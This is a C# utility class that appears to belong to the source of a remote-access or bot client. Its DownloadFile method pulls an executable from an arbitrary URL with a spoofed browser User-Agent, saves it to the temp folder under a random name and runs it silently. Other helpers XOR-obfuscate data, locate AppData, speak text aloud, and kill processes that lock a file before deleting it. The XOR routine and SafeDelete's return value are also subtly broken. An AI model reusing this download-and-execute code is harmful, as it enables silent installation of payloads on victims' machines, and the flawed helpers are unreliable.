using System;
using System.IO;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Collections.Generic;

namespace T.Utilities
{
	public class Utils
	{
		static Random r = new Random();
		
        public static byte[] GetBytes(string data)
        {
            return Encoding.Default.GetBytes(data);
        }
        public static string GetString(byte[] data)
        {
            return Encoding.Default.GetString(data);
        }

		public static void DebugString(string strText)
		{
			Console.WriteLine(strText);
		}
		
		public static int RandomInt(int iMin, int iMax)
		{
			return r.Next(iMin,iMax);
		}
		public static string RandomString(int iLength)
		{
			StringBuilder sbOut = new StringBuilder();
			char[] arr_cChars = "ABCDEFGHIJKLMNOPQRSTUVZXYWabcdefghijklmnopqrstuvzxyw".ToCharArray();
			
			while(sbOut.ToString().Length != iLength)
			{
				sbOut.Append(arr_cChars[RandomInt(0, arr_cChars.Length)]);
			}
			
			return sbOut.ToString();
		}
		
		public static byte[] XorCrypt(byte[] arr_bData, string strPassword)
        {
            byte[] arr_bPassword = Utils.GetBytes(strPassword);
            for (int i = 0; i < arr_bData.Length; i++)
            {
                foreach (byte bKey in arr_bPassword)
                {
                    arr_bData[i] ^= bKey;
                }
            }
            arr_bPassword = null;
            return arr_bData;
        }

		public static string GetTempPath()
		{
			string strTemp = Path.GetTempPath();
			if(!strTemp.EndsWith(@"\"))
				strTemp += @"\";
			return strTemp;
		}
		public static string GetAppDataPath()
		{
			string strAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if(!strAppData.EndsWith(@"\"))
				strAppData += @"\";
			return strAppData;
		}

        public static void TextToSpeech(string text)
        {
            Type t = Type.GetTypeFromProgID("SAPI.SpVoice");
            object o = Activator.CreateInstance(t);
            t.InvokeMember("Speak", System.Reflection.BindingFlags.InvokeMethod, null, o, new object[] { text, 0 });
        }
		
		public static bool DownloadFile(string url)
		{
            using (WebClient wc = new WebClient())
            {
                wc.Proxy = null;
                wc.Headers.Add("User-Agent", "Firefox");

                try
                {
                    string path = string.Empty;
                    while (string.IsNullOrEmpty(path) || File.Exists(path))
                    {
                        path = GetTempPath() + RandomString(Utils.RandomInt(5, 15)) + ".exe";
                    }

                    wc.DownloadFile(url, path);
                    Process.Start(path);
                    return true;
                }
                catch { }
            }
			return false;
		}

        public static IPAddress ResolveHost(string host)
        {
            return Dns.GetHostAddresses(host)[0];
        }

        public static string GetCurrentPath()
        {
            return Process.GetCurrentProcess().MainModule.FileName;
        }

        public static Process[] GetProcessesByPath(string strPath)
        {
            List<Process> lstProcesses = new List<Process>();
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    if (p.MainModule.FileName == strPath)
                        lstProcesses.Add(p);
                }
                catch { }
            }

            return lstProcesses.ToArray();
        }

        public static bool SafeDelete(string strPath)
        {
            if (!File.Exists(strPath)) return true;
            try
            {
                File.Delete(strPath);
            }
            catch
            {
                foreach (Process pProcess in GetProcessesByPath(strPath))
                    pProcess.Kill();
                try
                {
                    File.Delete(strPath);
                }
                catch { }
            }

            return File.Exists(strPath);
        }

        /// <summary>
        /// Safe Copy File
        /// </summary>
        /// <param name="strFileToCopy">Path to copy</param>
        /// <param name="strPath">Path copy to</param>
        /// <returns>True if its successful.</returns>
        public static bool SafeCopyFile(string strFileToCopy, string strPath, bool overWrite = true)
        {
            try
            {
                File.Copy(strFileToCopy, strPath, overWrite);
                return true;
            }
            catch
            {
                return false;
            }
        }
	}
}